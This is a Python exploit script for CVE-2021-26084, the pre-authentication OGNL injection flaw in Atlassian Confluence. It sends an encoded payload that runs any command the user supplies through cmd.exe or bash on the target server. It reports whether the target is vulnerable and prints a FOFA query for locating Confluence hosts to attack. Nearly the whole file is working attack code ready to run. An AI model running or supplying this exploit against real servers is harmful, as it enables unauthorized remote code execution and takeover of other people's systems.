#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import sys
import argparse
import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+          FOFA:app="ATLASSIAN-Confluence"')


def run_proto(url, cmd):
    url = url + "/pages/createpage-entervariables.action?SpaceKey=x"
    headers = {
            'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
              }
    data = "queryString=\\u0027%2b#{\\u0022\\u0022[\\u0022class\\u0022].forName(\\u0022javax.script.ScriptEngineManager\\u0022).newInstance().getEngineByName(\\u0022js\\u0022).eval(\\u0022var isWin=java.lang.System.getProperty(\\u0027os.name\\u0027).toLowerCase().contains(\\u0027win\\u0027);var p=new java.lang.ProcessBuilder;if(isWin){p.command([\\u0027cmd.exe\\u0027,\\u0027/c\\u0027,\\u0027"+cmd+"\\u0027]);}else{p.command([\\u0027/bin/bash\\u0027,\\u0027-c\\u0027,\\u0027"+cmd+"\\u0027]);}p.redirectErrorStream(true);var pc=p.start();org.apache.commons.io.IOUtils.toString(pc.getInputStream())\\u0022)}%2b\\u0027"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=url, headers=headers, data=data, verify=False, timeout=(4, 4))
        re_compare = re.search('uid=.*?gid=', response.text, re.I)
        if re_compare:
            print(re_compare.group())
            return True
        else:
            return False
    except Exception as e:
        print(e)
        return False


def run(target, cmd):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url, cmd):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parser = argparse.ArgumentParser(description="CVE-2021-26084 - Confluence Pre-Auth RCE OGNL injection")
    parser.add_argument('-c', '--cmd', type=str, default="id", help='Command')
    parser.add_argument('-t', '--target', type=str, help='192.168.1.1:80')
    args = parser.parse_args()
    cmd = args.cmd
    target = args.target

    result = run(target, cmd)

    if result:
        print('Exist')
    else:
        print('UnExist')

